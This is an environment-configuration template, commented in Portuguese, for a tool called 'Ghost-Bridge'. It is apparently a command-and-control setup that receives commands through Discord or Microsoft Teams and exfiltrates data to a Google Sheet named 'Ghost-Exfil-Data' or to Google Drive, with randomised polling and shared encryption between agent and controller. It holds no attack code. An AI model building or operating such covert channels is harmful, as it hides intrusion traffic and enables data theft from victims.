# Ghost-Bridge - Configuração de Ambiente
# Copie este arquivo para .env e preencha os valores

# ==========================================
# MODO DE OPERAÇÃO
# ==========================================
# MOCK = Simulado com JSON local (desenvolvimento)
# REAL = Usa APIs reais (produção)
OPERATION_MODE=MOCK

# ==========================================
# CONFIGURAÇÕES DE POLLING (Segundos)
# ==========================================
POLL_INTERVAL_MIN=2
POLL_INTERVAL_MAX=5

# ==========================================
# DISCORD (Downlink - Receber Comandos)
# ==========================================
# Bot Token: https://discord.com/developers/applications
DISCORD_BOT_TOKEN=

# ID do canal onde o bot lerá comandos
DISCORD_CHANNEL_ID=

# ==========================================
# MICROSOFT TEAMS (Alternativa ao Discord)
# ==========================================
# Webhook URL para postar mensagens (opcional)
TEAMS_WEBHOOK_URL=

# Para ler mensagens, precisa de Graph API:
TEAMS_TENANT_ID=
TEAMS_CLIENT_ID=
TEAMS_CLIENT_SECRET=
TEAMS_CHANNEL_ID=

# ==========================================
# GOOGLE SHEETS (Uplink - Exfiltrar Dados)
# ==========================================
# Caminho para o arquivo de credenciais JSON (Service Account)
# Download: Google Cloud Console > IAM > Service Accounts > Keys
GOOGLE_CREDENTIALS_FILE=credentials.json

# Nome da planilha no Google Sheets
GOOGLE_SHEET_NAME=Ghost-Exfil-Data

# ==========================================
# GOOGLE DRIVE (Alternativa para arquivos grandes)
# ==========================================
# ID da pasta onde fazer upload de arquivos
GOOGLE_DRIVE_FOLDER_ID=

# ==========================================
# CRIPTOGRAFIA
# ==========================================
# Chave Fernet (base64). Se vazio, gera automaticamente.
# Em produção, use a mesma chave no agente e controlador.
ENCRYPTION_KEY=
